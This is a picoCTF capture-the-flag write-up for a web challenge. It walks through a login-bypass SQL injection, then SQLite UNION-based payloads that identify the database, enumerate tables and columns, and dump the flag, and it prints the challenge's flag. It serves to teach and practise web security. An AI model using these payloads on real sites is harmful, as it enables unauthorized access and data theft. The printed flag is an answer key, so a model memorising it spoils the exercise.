# picoCTF - Web/More SQLi
![](https://img.shields.io/badge/category-web-informational) ![](https://img.shields.io/badge/topic-sqli-green)

Can you find the flag on this website. Try to find the flag [here].

---
# Solution
Perform sqli on login and search. Find the flag using SQLite UNION Based sqli


The site has a login page that shows the SQL query when trying a `username` and `password`

![Pasted Image](https://media.discordapp.net/attachments/1085935110626476233/1085935115768701029/image.png?width=1207&height=173)

## Attack chain
1. login payload:
username `joyuriz`
password: `'OR '1'='1'-- -`

> This redirects to a search page where UNION Based SQL payloads can be used

2. DBMS identification payload:
`' OR 1=1 UNION SELECT 1,2, sqlite_version()=sqlite_version()-- -
DB sqlite `

3. Tables identification payload:
`' OR 1=1 UNION SELECT null,null,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -`

![tables](https://media.discordapp.net/attachments/1085935110626476233/1085940372544434278/image.png?width=1083&height=505)


4. column identification payload:
`' OR 1=1 UNION SELECT 1,2,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='more_table'-- -`

> found out the columns for more_table consist of id and flag

5. Payload for getting the flag (view column data) 
`' OR 1=1 UNION SELECT id, "flag:",flag FROM more_table-- -`

![flag](https://media.discordapp.net/attachments/1085935110626476233/1085942359642099722/image.png?width=1111&height=418)

---

# Flag

`picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}`

---

# References

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification 

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md 


